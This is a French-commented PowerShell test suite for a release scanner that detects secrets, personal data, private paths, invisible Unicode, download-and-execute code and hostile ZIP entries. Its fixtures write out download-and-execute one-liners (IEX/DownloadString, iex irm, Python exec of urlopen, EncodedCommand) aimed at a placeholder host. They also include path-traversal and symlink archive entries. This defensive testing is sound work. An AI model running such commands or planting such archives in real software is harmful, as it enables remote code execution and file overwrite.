param([string]$Gitleaks = $env:GITLEAKS_PATH)
# Tests hostiles de check-release.ps1 (contre-audits du 26/11/2026 : CA-02 à CA-12, T3, puis C-01, M-05, M-06, M-09, m-04, m-07).
# Données 100 % fictives générées à la volée, dossiers temporaires supprimés en fin d'exécution.
# Usage : pwsh -NoProfile -File tests/test-check-release.ps1 -Gitleaks <chemin de gitleaks>
#         (ou powershell -NoProfile -File ... sous Windows PowerShell 5.1)
$ErrorActionPreference = 'Stop'
$scanner = Join-Path $PSScriptRoot '..\skills\github-open-source-release\scripts\check-release.ps1'
# Le scanner est lancé avec le même moteur que cette suite (pwsh ou powershell).
$engine = [Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
if (!$Gitleaks -or !(Test-Path -LiteralPath $Gitleaks)) {
  Write-Output 'SKIP : gitleaks introuvable (paramètre -Gitleaks ou GITLEAKS_PATH).'
  # En intégration continue, une suite qui n'a pas tourné est un échec, pas un succès silencieux.
  if ($env:CI) { exit 1 }
  exit 2
}
$env:GITLEAKS_PATH = $Gitleaks
$root = Join-Path ([IO.Path]::GetTempPath()) ('ct-check-release-' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$utf8 = New-Object System.Text.UTF8Encoding($false)
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem
$userPath = 'C:' + '\Us' + 'ers\jdupont\Documents'          # chemin privé fictif, assemblé pour ne pas se signaler lui-même
$canaryUserPath = 'C:' + '\Us' + 'ers\CANARY_TEST_user\Documents'
$personalMail = 'jean.dupont' + '@' + 'gmail.com'
$failures = 0; $count = 0
# Toute valeur sensible fictive utilisée par la suite ; aucune ne doit apparaître dans la sortie du scanner.
$sensitive = [Collections.Generic.List[string]]::new()
$sensitive.Add($personalMail); $sensitive.Add('jdupont')
# Entrée ZIP marquée comme lien symbolique Unix (S_IFLNK | 0777) dans les attributs externes.
$linkAttr = [BitConverter]::ToInt32([BitConverter]::GetBytes([uint32]2717843456), 0)

function New-Case([string]$name) {
  $d = Join-Path $root $name; New-Item -ItemType Directory -Force $d | Out-Null
  [IO.File]::WriteAllText((Join-Path $d 'README.md'), "# Projet fictif`n", $utf8); return $d
}
function W([string]$dir, [string]$rel, [string]$text) {
  $p = Join-Path $dir $rel; New-Item -ItemType Directory -Force (Split-Path $p) | Out-Null; [IO.File]::WriteAllText($p, $text, $utf8)
}
function New-Zip([string]$dir, [string]$name, [hashtable]$files) {
  $src = Join-Path $root ('zipsrc-' + [guid]::NewGuid().ToString('N').Substring(0, 6)); New-Item -ItemType Directory $src | Out-Null
  foreach ($k in $files.Keys) { W $src $k $files[$k] }
  [IO.Compression.ZipFile]::CreateFromDirectory($src, (Join-Path $dir $name))
}
# Archive construite octet par octet : noms d'entrées hostiles, attributs et contenus maîtrisés.
# Chaque entrée : @{ name = '...'; text = '...' } ou bytes = [byte[]] ou zeros = <octets nuls> ; attr = attributs externes.
function New-ZipBytes([object[]]$entries) {
  $ms = New-Object IO.MemoryStream
  $za = New-Object IO.Compression.ZipArchive($ms, [IO.Compression.ZipArchiveMode]::Create, $true)
  try {
    foreach ($e in $entries) {
      $z = $za.CreateEntry([string]$e.name)
      if ($e.ContainsKey('attr')) { $z.ExternalAttributes = [int]$e.attr }
      $st = $z.Open()
      try {
        if ($e.ContainsKey('bytes')) { $b = [byte[]]$e.bytes; $st.Write($b, 0, $b.Length) }
        elseif ($e.ContainsKey('zeros')) {
          $chunk = New-Object byte[] 1048576; $left = [int64]$e.zeros
          while ($left -gt 0) { $n = [int][Math]::Min($left, $chunk.Length); $st.Write($chunk, 0, $n); $left -= $n }
        }
        elseif ($e.ContainsKey('text')) { $b = $utf8.GetBytes([string]$e.text); $st.Write($b, 0, $b.Length) }
      } finally { $st.Dispose() }
    }
  } finally { $za.Dispose() }
  $bytes = $ms.ToArray(); $ms.Dispose()
  return ,$bytes
}
function New-HostileZip([string]$path, [object[]]$entries) {
  New-Item -ItemType Directory -Force (Split-Path $path) | Out-Null
  [IO.File]::WriteAllBytes($path, [byte[]](New-ZipBytes $entries))
}
function Invoke-Scan([string[]]$extra) {
  $out = (& $engine -NoProfile -File $scanner @extra 2>&1 | Out-String).Trim()
  $json = $out -split "`n" | Where-Object { $_ -match '^\{' } | Select-Object -Last 1
  $obj = $null; try { $obj = $json | ConvertFrom-Json } catch {}
  return @{ out = $out; obj = $obj }
}
function Test-NoLeak([string]$out) {
  foreach ($v in $script:sensitive) { if ($v -and $out.Contains($v)) { return $false } }
  return $true
}
function Check([string]$label, [bool]$ok, [string]$detail) {
  $script:count++
  if ($ok) { Write-Output "PASS $label" } else { $script:failures++; Write-Output "FAIL $label : $detail" }
}
function Expect([string]$label, [string]$dir, [string]$expected, [string]$gitRoot) {
  $script:count++
  $scanArgs = @('-ArtifactPath', $dir)
  $scanArgs += if ($gitRoot) { @('-GitRoot', $gitRoot) } else { @('-Fast') }
  $res = Invoke-Scan $scanArgs
  $out = $res.out; $obj = $res.obj
  $got = if ($obj.status -eq 'passed') { 'passed' } elseif ($obj) { "$($obj.stage)/$($obj.reason)" } else { 'erreur' }
  $ok = if ($expected -eq 'passed') { $got -eq 'passed' } else { $got -eq $expected }
  if ($ok -and $got -eq 'passed') {
    # Un succès doit porter une empreinte et le mode réellement exécuté.
    $wantMode = if ($gitRoot) { 'full' } else { 'fast' }
    if ($obj.sha256 -notmatch '^[0-9A-F]{64}$' -or $obj.mode -ne $wantMode) { $ok = $false; $got += " (mode=$($obj.mode), sha256=$($obj.sha256))" }
  }
  if (!(Test-NoLeak $out)) { $ok = $false; $got += ' (valeur affichée !)' }
  if ($ok) { Write-Output "PASS $label" } else { $script:failures++; Write-Output "FAIL $label : obtenu $got, attendu $expected" }
}

try {
  New-Item -ItemType Directory $root | Out-Null
  # Témoins
  $d = New-Case 'temoin'; W $d 'app.py' "print('ok')`n"; Expect 'témoin propre' $d 'passed'
  $d = New-Case 'binaire'; [IO.File]::WriteAllBytes((Join-Path $d 'image.png'), [byte[]](0x89, 0x50, 0x4E, 0x47, 0, 0, 0, 13, 0, 1, 2, 3)); Expect 'image binaire ignorée' $d 'passed'
  $d = New-Case 'gros-binaire'; $fs = [IO.File]::Create((Join-Path $d 'video.mp4')); $fs.SetLength(11MB); $fs.Dispose(); Expect 'gros fichier binaire ignoré' $d 'passed'

  # CA-02 : fichiers de secrets reconnus par leur nom
  foreach ($f in @('id_rsa', 'id_ed25519', 'credentials.json', 'service-account-prod.json', '.git-credentials', '.netrc', 'secrets.yaml', 'secrets.json', 'client.p12', 'app.keystore', '.ssh/config', '.aws/credentials')) {
    $d = New-Case ('nom-' + ($f -replace '[^a-z0-9]', '_')); W $d $f "valeur=fictive`n"; Expect "CA-02 nom $f" $d 'artifact-layout/private-entry'
  }
  $d = New-Case 'nom-legit'; W $d 'docs/credentials-guide.md' "# Guide`n"; W $d 'id_rsa.pub' "ssh-ed25519 AAAA fictive`n"; Expect 'CA-02 témoin : guide et clé publique acceptés' $d 'passed'
  # M-06 / m-07 : noms privés annoncés par le README et liste complétée
  foreach ($f in @('.env', '.env.local', 'config/.env.production', 'cle.pem', 'prive.key', 'base.sqlite', 'base.sqlite3-wal', 'app.db', '.kube/config', '.docker/config.json', 'terraform.tfstate', 'infra/prod.tfstate.backup', 'coffre.kdbx', 'client.ovpn', '.htpasswd')) {
    $d = New-Case ('prive-' + ($f -replace '[^a-z0-9]', '_')); W $d $f "valeur=fictive`n"; Expect "M-06 nom privé $f" $d 'artifact-layout/private-entry'
  }
  $d = New-Case 'env-example'; W $d '.env.example' "API_URL=https://exemple.invalid`n"; W $d 'docs/kube-config.md' "# Guide`n"; Expect 'M-06 témoin : .env.example et documentation acceptés' $d 'passed'

  # CA-03 : contenu des archives et documents Office dans un dossier
  $d = New-Case 'zip-chemin'; New-Zip $d 'docs.zip' @{ 'notes.md' = "Voir $userPath`n" }; Expect 'CA-03 chemin privé dans un ZIP' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'docx-mail'; New-Zip $d 'rapport.docx' @{ 'word/document.xml' = "<w:t>$personalMail</w:t>" }; Expect 'CA-03 e-mail dans un .docx' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'zip-renomme'; New-Zip $d 'sauvegarde.bak' @{ 'notes.md' = "Voir $userPath`n" }; Expect 'CA-03 ZIP renommé en .bak' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'zip-docx'; $inner = Join-Path $root 'innerdocx'; New-Item -ItemType Directory $inner | Out-Null; New-Zip $inner 'a.docx' @{ 'word/document.xml' = "<w:t>$personalMail</w:t>" }; [IO.Compression.ZipFile]::CreateFromDirectory($inner, (Join-Path $d 'lot.zip')); Expect 'CA-03 .docx dans un ZIP' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'zip-unicode'; New-Zip $d 'src.zip' @{ 'a.js' = ("const ok = 1;" + [char]0x200B + "`n") }; Expect 'CA-03 Unicode invisible dans un ZIP' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'zip-casse'; [IO.File]::WriteAllBytes((Join-Path $d 'faux.zip'), [byte[]](0x50, 0x4B, 3, 4, 1, 2, 3)); Expect 'CA-03 archive illisible refusée' $d 'artifact-layout/unscannable-archive'

  # CA-04 : le marqueur CANARY_TEST_ n'exempte plus une vraie donnée
  $d = New-Case 'canary-mail'; W $d 'fixture.md' "CANARY_TEST_ contact : $personalMail`n"; Expect 'CA-04 e-mail réel sur une ligne CANARY' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'canary-chemin'; W $d 'fixture.md' "CANARY_TEST_ dossier : $userPath`n"; Expect 'CA-04 chemin réel sur une ligne CANARY' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'canary-ok'; W $d 'fixture.md' ("CANARY_TEST_ dossier : $canaryUserPath`nCANARY_TEST_ mail : canary_test_user@example.test et x@example.test`n"); Expect 'CA-04 témoin : vraies fixtures CANARY acceptées' $d 'passed'

  # C-01 : le marqueur n'exempte jamais une ligne entière ; IBAN, NIR et téléphone ne peuvent pas être exemptés
  $iban = 'FR76 ' + '3000 6000 0112 3456 7890 189'; $sensitive.Add($iban)
  $nir = '1 85 05' + ' 78 006 084 36'; $sensitive.Add($nir)
  $fakePhone = '06 00' + ' 00 00 00'; $sensitive.Add($fakePhone)
  $canaryPublicMail = 'canary_test_user@' + $personalMail.Split('@')[1]; $sensitive.Add($canaryPublicMail)
  $d = New-Case 'c01-iban'; W $d 'fixture.md' "CANARY_TEST_ IBAN : $iban`n"; Expect 'C-01 IBAN sur une ligne CANARY bloqué' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'c01-iban-fin'; W $d 'fixture.md' "IBAN $iban CANARY_TEST_`n"; Expect 'C-01 IBAN suivi du marqueur bloqué' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'c01-nir'; W $d 'fixture.md' "CANARY_TEST_ NIR : $nir`n"; Expect 'C-01 NIR sur une ligne CANARY bloqué' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'c01-tel'; W $d 'fixture.md' "CANARY_TEST_ tél. $fakePhone`n"; Expect 'C-01 téléphone sur une ligne CANARY bloqué' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'c01-mail-public'; W $d 'fixture.md' "Contact : $canaryPublicMail`n"; Expect 'm-04 partie locale canary_test_ chez un fournisseur public bloquée' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'c01-chemin-mixte'; W $d 'fixture.md' "CANARY_TEST_ : $canaryUserPath puis $userPath`n"; Expect 'C-01 seule la valeur marquée est exemptée (chemin réel bloqué)' $d 'artifact-dlp/dlp-private-path'

  # CA-05 : fichiers texte que le contrôle ignorait en silence
  $d = New-Case 'utf16'; [IO.File]::WriteAllText((Join-Path $d 'notes.txt'), "Voir $userPath`r`n", [Text.Encoding]::Unicode); Expect 'CA-05 texte UTF-16' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'utf16-sans-bom'; [IO.File]::WriteAllBytes((Join-Path $d 'notes.txt'), [Text.Encoding]::Unicode.GetBytes("Contact $personalMail`r`n")); Expect 'CA-05 texte UTF-16 sans BOM' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'octet-nul'; [IO.File]::WriteAllBytes((Join-Path $d 'notes.md'), [byte[]](@(0) + [Text.Encoding]::UTF8.GetBytes("`nVoir $userPath`n"))); Expect 'CA-05 octet nul en tête d''un .md' $d 'artifact-dlp/dlp-private-path'
  # Clés cachées là où gitleaks ne regarde pas (format fictif généré à la volée)
  $token = 'gh' + 'p_' + (-join (1..36 | ForEach-Object { 'abcdefghijklmnopqrstuvwxyz0123456789'[(Get-Random -Maximum 36)] })); $sensitive.Add($token)
  $d = New-Case 'cle-utf16'; [IO.File]::WriteAllText((Join-Path $d 'notes.txt'), "TOKEN=$token`r`n", [Text.Encoding]::Unicode); Expect 'CA-05 clé dans un texte UTF-16' $d 'artifact-dlp/secret-pattern'
  $d = New-Case 'cle-docx'; New-Zip $d 'acces.docx' @{ 'word/document.xml' = "<w:t>$token</w:t>" }; Expect 'CA-03 clé dans un .docx' $d 'artifact-dlp/secret-pattern'
  $d = New-Case 'cle-bak'; New-Zip $d 'vieux.bak' @{ 'cfg.txt' = "TOKEN=$token`n" }; Expect 'CA-03 clé dans une archive renommée' $d 'artifact-dlp/secret-pattern'
  # CA-06 : chemins privés sur un autre disque ou un partage réseau
  $d = New-Case 'autre-disque'; W $d 'notes.md' ("Factures dans D:" + "\Clients\Dupont SARL\2026`n"); Expect 'CA-06 dossier client sur un autre disque' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'onedrive'; W $d 'notes.md' ("Copie dans F:" + "\OneDrive\Documents\paie.xlsx`n"); Expect 'CA-06 OneDrive sur un autre disque' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'unc'; W $d 'notes.md' ("Partage \\" + "SERVEUR-MAX\paie\janvier`n"); Expect 'CA-06 partage réseau nommé' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'chemins-neutres'; W $d 'doc.md' ("Exemples : C:\Windows\System32, C:\Program Files\App, C:\chemin\racine-autorisee, D:\data\exemple.txt, \\" + "localhost\c$\Windows, \\" + "?\C:\Windows, \\" + ".\NUL, //serveur/partage/fichier.txt`n"); Expect 'CA-06 témoin : chemins système et exemples acceptés' $d 'passed'

  # CA-07 : autres formes de téléchargement-exécution et extensions de scripts
  $dl = 'https://exemple.invalid/x'
  $d = New-Case 'downloadstring'; W $d 'setup.ps1' ("I" + "EX (New-Object Net.WebClient).Download" + "String('$dl')`n"); Expect 'CA-07 DownloadString exécuté' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'scriptblock'; W $d 'setup.ps1' ("& ([script" + "block]::Create((i" + "wr $dl).Content))`n"); Expect 'CA-07 scriptblock téléchargé' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'python-exec'; W $d 'run.py' ("import urllib.request`nex" + "ec(urllib.request.url" + "open('$dl').read())`n"); Expect 'CA-07 exec Python d''un téléchargement' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'encoded'; W $d 'run.ps1' ("powershell -Encoded" + "Command SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoA`n"); Expect 'CA-07 commande encodée' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'bat'; W $d 'install.bat' ("powershell -c `"i" + "ex (i" + "rm $dl)`"`n"); Expect 'CA-07 téléchargement-exécution dans un .bat' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'sast-neutre'; W $d 'tools.ps1' "Invoke-WebRequest -Uri '$dl' -OutFile x.zip`nGet-FileHash x.zip`n"; Expect 'CA-07 témoin : simple téléchargement de fichier accepté' $d 'passed'

  # C-01 : zéro exemption SAST hors tests/fixtures/ (et seulement sur une ligne marquée)
  $iexLine = "i" + "ex (i" + "rm $dl)"
  $d = New-Case 'c01-sast-canary'; W $d 'setup.ps1' "$iexLine  # CANARY_TEST_`n"; Expect 'C-01 SAST : commentaire CANARY_TEST_ sur une ligne dangereuse bloqué' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'c01-sast-canary-md'; W $d 'docs/install.md' "CANARY_TEST_ : $iexLine`n"; Expect 'C-01 SAST : ligne marquée dans la documentation bloquée' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'c01-sast-fixture'; W $d 'tests/fixtures/scanner.ps1' "$iexLine  # CANARY_TEST_`n"; Expect 'C-01 témoin : fixture de scanner marquée sous tests/fixtures/ acceptée' $d 'passed'
  $d = New-Case 'c01-sast-fixture-nue'; W $d 'tests/fixtures/scanner.ps1' "$iexLine`n"; Expect 'C-01 SAST : fixture sans marqueur bloquée' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'c01-sast-faux-fixture'; W $d 'src/tests/fixtures/x.ps1' "$iexLine  # CANARY_TEST_`n"; Expect 'C-01 SAST : tests/fixtures/ seulement à la racine' $d 'artifact-sast/sast-dangerous-pattern'
  $d = New-Case 'c01-sast-zip'; New-HostileZip (Join-Path $d 'lot.zip') @(@{ name = 'setup.ps1'; text = "$iexLine # CANARY_TEST_`n" }); Expect 'C-01 SAST : ligne marquée dans un ZIP bloquée' $d 'artifact-sast/sast-dangerous-pattern'

  # CA-11 : caractères invisibles supplémentaires et mélange d'alphabets
  $d = New-Case 'word-joiner'; W $d 'a.js' ("const ok = 1;" + [char]0x2060 + "`n"); Expect 'CA-11 U+2060 invisible' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'bom-milieu'; W $d 'a.js' ("const a = 1;" + [char]0xFEFF + "`n"); Expect 'CA-11 U+FEFF au milieu du fichier' $d 'artifact-sast/sast-invisible-unicode'
  $d = New-Case 'homoglyphe'; W $d 'a.js' ("const p" + [char]0x0430 + "ssword = 1;`n"); Expect 'CA-11 identifiant latin et cyrillique mélangés' $d 'artifact-sast/sast-homoglyph'
  $d = New-Case 'cyrillique-ok'; W $d 'README.md' ("Привет : bonjour en russe.`n"); Expect 'CA-11 témoin : texte russe dans la documentation accepté' $d 'passed'

  # CA-12 : téléphone portable et e-mail dans un nom de fichier
  $phone = '06 12' + ' 34 56 78'   # numéro fictif, assemblé pour ne pas se signaler lui-même
  $d = New-Case 'telephone'; W $d 'contact.md' "Tél. : $phone`n"; Expect 'CA-12 numéro de portable' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'telephone-intl'; W $d 'contact.md' ("Tel +33 7" + " 12 34 56 78`n"); Expect 'CA-12 numéro de portable international' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'mail-nom'; [IO.File]::WriteAllText((Join-Path $d ('export-' + $personalMail + '.csv')), "a;b`n", $utf8); Expect 'CA-12 e-mail dans un nom de fichier' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'mail-nom-vide'; New-Item -ItemType File (Join-Path $d ('vide-' + $personalMail + '.txt')) | Out-Null; Expect 'CA-12 e-mail dans le nom d''un fichier vide' $d 'artifact-dlp/dlp-pii'
  $d = New-Case 'dossiers-internes'; W $d 'doc.md' ("Copies : ~/.codex/skills, `$HOME/.gemini/config, %USERPROFILE%\.memento\x et `$env:USERPROFILE\.codex\y`n"); Expect 'Témoin : dossiers internes écrits avec ~ ou une variable acceptés' $d 'passed'
  $d = New-Case 'gitignore-interne'; W $d '.gitignore' "/.memento/`n.codex/`n.gemini/`n"; W $d 'doc.md' "Copies dans ``.codex/skills/`` et ``.agents/skills/``.`n"; Expect 'Témoin : dossiers internes nommés seuls (.gitignore, doc) acceptés' $d 'passed'
  $d = New-Case 'dossier-interne-absolu'; W $d 'doc.md' ("Base : D:\Projets\app\." + "memento\db`n"); Expect 'Dossier interne sous un chemin absolu' $d 'artifact-dlp/dlp-private-path'
  $d = New-Case 'nombres-ok'; W $d 'notes.md' "Version 0612.3456, ticket 0612345678901, date 06/12/2026`n"; Expect 'CA-12 témoin : nombres ordinaires acceptés' $d 'passed'

  # CA-08 : données personnelles restées dans l'historique Git (mode complet)
  function New-Repo([string]$name) {
    $r = Join-Path $root $name; New-Item -ItemType Directory $r | Out-Null
    git -C $r init -q -b main; git -C $r config user.name 'CANARY_TEST'; git -C $r config user.email '1+canary@users.noreply.github.com'; git -C $r config commit.gpgsign false
    return $r
  }
  function New-Candidate([string]$repo) {
    $c = "$repo-candidat"; New-Item -ItemType Directory $c | Out-Null
    foreach ($x in @(git -C $repo ls-files)) { $dst = Join-Path $c $x; New-Item -ItemType Directory -Force (Split-Path $dst) | Out-Null; Copy-Item -LiteralPath (Join-Path $repo $x) $dst }
    return $c
  }
  $r = New-Repo 'git-chemin'; W $r 'n.md' "Voir $userPath`n"; git -C $r add -A; git -C $r commit -q -m 'a'; W $r 'n.md' "propre`n"; git -C $r add -A; git -C $r commit -q -m 'b'
  Expect 'CA-08 chemin privé effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-private-path' $r
  $r = New-Repo 'git-message'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m "Jeton de secours $token"
  Expect 'CA-08 clé écrite dans un message de commit' (New-Candidate $r) 'git-dlp/secret-pattern' $r
  $r = New-Repo 'git-tel'; W $r 'c.md' "Tél. $phone`n"; git -C $r add -A; git -C $r commit -q -m 'a'; git -C $r rm -q c.md; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'b'
  Expect 'CA-08 numéro effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-pii' $r
  $r = New-Repo 'git-propre'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'Initial'
  $cPropre = New-Candidate $r
  Expect 'CA-08 témoin : historique propre accepté' $cPropre 'passed' $r

  # M-09 : le mode annoncé reflète ce qui a vraiment été contrôlé
  $res = Invoke-Scan @('-ArtifactPath', $cPropre, '-GitRoot', $r)
  Check 'M-09 mode complet avec -GitRoot' ($res.obj.status -eq 'passed' -and $res.obj.mode -eq 'full' -and $res.obj.gitHistory -eq 'checked') "$($res.out)"
  $res = Invoke-Scan @('-ArtifactPath', $cPropre)
  Check 'M-09 sans -GitRoot hors -Fast : mode partial' ($res.obj.status -eq 'passed' -and $res.obj.mode -eq 'partial' -and $res.obj.gitHistory -eq 'not-requested' -and -not $res.obj.fastMode) "$($res.out)"
  $res = Invoke-Scan @('-ArtifactPath', $cPropre, '-Fast', '-GitRoot', $r)
  Check 'M-09 -Fast ignore -GitRoot et le dit' ($res.obj.status -eq 'passed' -and $res.obj.mode -eq 'fast' -and $res.obj.gitHistory -eq 'skipped-fast') "$($res.out)"

  # M-06 : identité Git, dépôt superficiel, exceptions locales, mauvaise racine
  $r = New-Repo 'git-auteur'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r -c "user.email=$personalMail" commit -q -m 'a'
  Expect 'M-06 adresse personnelle d''auteur dans l''historique' (New-Candidate $r) 'git-identity/git-personal-email' $r
  $r = New-Repo 'git-coauteur'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'a' -m "Co-authored-by: CANARY_TEST <$personalMail>"
  Expect 'M-06 adresse personnelle dans un trailer Co-authored-by' (New-Candidate $r) 'git-identity/git-personal-email' $r
  $r = New-Repo 'git-source-shallow'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'a'; W $r 'a.txt' "y`n"; git -C $r add -A; git -C $r commit -q -m 'b'
  $shallow = Join-Path $root 'git-shallow'; git clone -q --depth 1 ('file:///' + ($r -replace '\\', '/')) $shallow
  Expect 'M-06 dépôt superficiel refusé' (New-Candidate $shallow) 'git-layout/invalid-or-shallow-git' $shallow
  $r = New-Repo 'git-gitleaksignore'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'a'; W $r '.gitleaksignore' "fictif`n"
  Expect 'M-06 exceptions Gitleaks locales refusées' (New-Candidate $r) 'git-layout/project-scan-exceptions' $r
  $r = New-Repo 'git-sous-dossier'; W $r 'sub/a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'a'
  Expect 'M-06 -GitRoot sur un sous-dossier refusé' (New-Candidate $r) 'git-layout/invalid-git-root' (Join-Path $r 'sub')

  # Tranche 3 : mot de passe écrit en dur et jeton dans un fichier de configuration de paquets
  $pw = 'Soud' + 'ure2026!'   # valeur fictive assemblée pour ne pas se signaler elle-même
  $sensitive.Add($pw)
  $d = New-Case 'pw-python'; W $d 'settings.py' ("PASS" + "WORD = '$pw'`n"); Expect 'T3 mot de passe en dur (Python)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-js'; W $d 'db.js' ("const db" + "Password = `"$pw`";`n"); Expect 'T3 mot de passe en dur (JavaScript)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-json'; W $d 'config.json' ("{ `"api" + "_key`": `"$pw-abc`" }`n"); Expect 'T3 clé en dur (JSON)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-yaml'; W $d 'app.yml' ("sec" + "ret: $pw`n"); Expect 'T3 secret en dur (YAML)' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'npmrc'; W $d '.npmrc' ("//registry.npmjs.org/:_auth" + "Token=" + "npm_" + "fictif1234567890`n"); Expect 'T3 jeton dans .npmrc' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pypirc'; W $d '.pypirc' ("[pypi]`nusername = __token__`npass" + "word = " + "pypi-" + "fictif1234567890`n"); Expect 'T3 jeton dans .pypirc' $d 'artifact-dlp/hardcoded-credential'
  $d = New-Case 'pw-neutres'; W $d 'cfg.py' ("PASS" + "WORD = os.environ['DB_PASSWORD']`ntoken = os.getenv('TOKEN')`npassword = ''`napi_key = '<votre-clé>'`nsecret = '" + '${SECRET}' + "'`npassword = 'changeme'`npassword_field = 'mot de passe'`n"); W $d 'README.md' "Le mot de passe doit faire 12 caractères ; password: voir le gestionnaire.`n"; W $d '.npmrc' "registry=https://registry.npmjs.org/`n//registry.npmjs.org/:_authToken=`${NPM_TOKEN}`n"
  Expect 'T3 témoin : variables d''environnement, valeurs vides et exemples acceptés' $d 'passed'
  $d = New-Case 'pw-canary'; W $d 'test_auth.py' ("password = 'CANARY_TEST_motdepasse'`n"); Expect 'T3 témoin : mot de passe fictif CANARY_TEST_ accepté' $d 'passed'

  # M-05 / M-06 : artefacts .zip hostiles (structure contrôlée avant tout scan de contenu)
  $z = Join-Path $root 'zips'
  New-HostileZip "$z\temoin.zip" @(@{ name = 'skill/SKILL.md'; text = "# Fictif`n" }, @{ name = 'skill/scripts/a.py'; text = "print('ok')`n" })
  Expect 'M-06 témoin : artefact .zip propre accepté' "$z\temoin.zip" 'passed'
  foreach ($bad in @('../evil.txt', 'skill/../../evil.txt', '/abs.txt', 'C:evil.txt', 'skill\..\..\evil.txt', 'skill/CON.txt', 'skill/fin.', 'skill/ /x.txt')) {
    $name = 'unsafe-' + ($bad -replace '[^a-zA-Z0-9]', '_') + '.zip'
    New-HostileZip "$z\$name" @(@{ name = 'skill/SKILL.md'; text = "# Fictif`n" }, @{ name = $bad; text = "CANARY_TEST_`n" })
    Expect "M-06 entrée ZIP hostile '$bad'" "$z\$name" 'artifact-layout/unsafe-entry'
  }
  New-HostileZip "$z\dir-traversal.zip" @(@{ name = 'skill/a.txt'; text = "x`n" }, @{ name = '../'; text = '' })
  Expect 'M-06 entrée dossier ../ dans un ZIP' "$z\dir-traversal.zip" 'artifact-layout/unsafe-entry'
  New-HostileZip "$z\doublon.zip" @(@{ name = 'skill/A.txt'; text = "x`n" }, @{ name = 'skill/a.txt'; text = "y`n" })
  Expect 'M-06 doublon de casse dans un ZIP' "$z\doublon.zip" 'artifact-layout/duplicate-entry'
  New-HostileZip "$z\lien.zip" @(@{ name = 'skill/a.txt'; text = "x`n" }, @{ name = 'skill/lien'; text = '../../hors-depot'; attr = $linkAttr })
  Expect 'M-06 lien symbolique dans un ZIP' "$z\lien.zip" 'artifact-layout/linked-entry'
  New-HostileZip "$z\prive.zip" @(@{ name = 'skill/a.txt'; text = "x`n" }, @{ name = 'skill/.env'; text = "X=CANARY_TEST_`n" })
  Expect 'M-06 fichier privé dans un ZIP' "$z\prive.zip" 'artifact-layout/private-entry'
  $lvl = New-ZipBytes @(@{ name = 'feuille.txt'; text = "CANARY_TEST_`n" })
  foreach ($i in 1..2) { $lvl = New-ZipBytes @(@{ name = "niveau$i.zip"; bytes = $lvl }) }
  [IO.File]::WriteAllBytes("$z\profondeur-3.zip", $lvl)
  Expect 'M-06 témoin : imbrication sur 3 niveaux acceptée' "$z\profondeur-3.zip" 'passed'
  $lvl = New-ZipBytes @(@{ name = 'niveau-sup.zip'; bytes = $lvl })
  [IO.File]::WriteAllBytes("$z\profondeur-4.zip", $lvl)
  Expect 'M-06 imbrication sur 4 niveaux refusée' "$z\profondeur-4.zip" 'artifact-layout/archive-too-deep'
  $inner = New-ZipBytes @(@{ name = '../evil.txt'; text = "x`n" })
  New-HostileZip "$z\renomme.zip" @(@{ name = 'skill/a.txt'; text = "x`n" }, @{ name = 'skill/donnees.bak'; bytes = $inner })
  Expect 'M-05 archive renommée dans un ZIP : structure contrôlée' "$z\renomme.zip" 'artifact-layout/unsafe-entry'
  New-HostileZip "$z\vide.zip" @(@{ name = 'skill/'; text = '' })
  Expect 'M-06 ZIP sans fichier refusé' "$z\vide.zip" 'artifact-layout/empty-artifact'
  [IO.File]::WriteAllText("$z\pas-un-zip.txt", "x`n", $utf8)
  Expect 'M-06 artefact ni dossier ni .zip refusé' "$z\pas-un-zip.txt" 'artifact-layout/unsupported-artifact'
  [IO.File]::WriteAllBytes("$z\casse.zip", [byte[]](0x50, 0x4B, 3, 4, 1, 2, 3))
